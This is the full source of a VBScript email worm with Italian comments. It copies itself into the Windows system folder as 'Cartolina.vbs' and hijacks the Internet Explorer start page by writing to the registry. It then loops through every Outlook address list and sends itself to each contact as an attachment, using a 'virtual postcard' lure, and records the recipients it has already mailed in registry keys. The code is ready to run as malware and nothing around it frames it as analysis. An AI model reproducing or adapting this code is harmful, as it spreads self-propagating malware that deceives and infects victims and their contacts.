 On Error Resume Next

dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit	=	CreateObject("WScript.Shell")
set out		=	WScript.CreateObject("Outlook.Application")
set mapi	=	out.GetNameSpace("MAPI")
Set fso 	= 	CreateObject("Scripting.FileSystemObject")
set file 	= 	fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy		=	file.ReadAll

Set dirwin 	= 	fso.GetSpecialFolder(0)
Set dirsystem 	= 	fso.GetSpecialFolder(1)
Set dirtemp 	= 	fso.GetSpecialFolder(2)
Set c 		= 	fso.GetFile(WScript.ScriptFullName)

c.Copy(dirsystem&"\Cartolina.vbs")

Rem -------------------------------------------------------
rem Modifica la pagina di avvio di IE.X.x

regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start page","http://www.vije.it"

Rem -------------------------------------------------------
rem Ciclo per l'invio delle email


for ctrlists=1 to mapi.AddressLists.Count


	set a=mapi.AddressLists(ctrlists)
	x=1
	regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)

		if (regv="") then
			regv=1
		end if

	if (int(a.AddressEntries.Count)>int(regv)) then
		for ctrentries=1 to a.AddressEntries.Count
			malead=a.AddressEntries(x)
			regad=""
			regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)

				if (regad="") then
					set male=out.CreateItem(0)
					male.Recipients.Add(malead)
					male.Subject = "C'è una cartolina per te!"
					male.Body = vbcrlf&"Ciao, un tuo amico ti ha spedito una cartolina virtuale... mooolto particolare!"
  					male.Attachments.Add(dirsystem&"\Cartolina.vbs")
 					male.Send
					regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
				end if

			x=x+1
		next
			regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
	else
			regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
	end if



next

			

Set out=Nothing
Set mapi=Nothing

Rem ------------------------------------------------------